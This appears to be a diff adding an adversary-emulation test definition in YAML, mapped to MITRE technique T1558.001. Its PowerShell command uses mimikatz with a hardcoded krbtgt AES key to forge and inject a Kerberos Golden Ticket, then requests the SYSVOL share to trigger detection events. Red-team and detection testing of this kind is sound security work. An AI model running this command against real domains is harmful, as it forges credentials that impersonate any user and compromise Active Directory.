@@ -1,0 +1,44 @@
+---
+- id: 6d0695f8f33776c82ad1294b6c6f02cd
+  name: Crafting Active Directory golden tickets with mimikatz
+  description: 'Once the hash of the special krbtgt user is retrieved it is possible
+    to craft Kerberos Ticket Granting Ticket impersonating any user in the Active
+    Directory domain.
+
+    This test crafts a Golden Ticket and then performs an SMB request with it for
+    the SYSVOL share, thus triggering a service ticket request (event ID 4769).
+
+    The generated ticket is injected in a new empty Windows session and discarded
+    after, so it does not pollute the current Windows session.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1558.001
+    name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
+  platforms:
+    windows:
+      psh:
+        command: Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; Remove-Item
+          $env:TEMP\golden.txt -ErrorAction Ignore; $domain_sid = "S-1-5-21-DEFAULT";
+          If ($domain_sid -Match "DEFAULT") {;   $domain = gwmi Win32_ComputerSystem
+          | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount
+          $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid
+          = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @"; >%TEMP%\golden.txt
+          2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist
+          purge;   PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+          "kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+          /user:goldenticketfakeuser /ptt" "exit";   echo.;   echo Requesting SYSVOL:;   dir
+          \\%userdnsdomain%\SYSVOL;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo
+          End of Golden Ticket attack; ); "@ -Replace "DOMAIN_SID", $domain_sid |
+          Out-File -Encoding OEM $env:TEMP\golden.bat; echo "foo" | runas /netonly
+          /user:fake "$env:TEMP\golden.bat" | Out-Null; do {;   Start-Sleep 1;   Get-Content
+          -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {;     if ($_ -match
+          'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content
+          $env:TEMP\golden.txt; Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;
+          Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
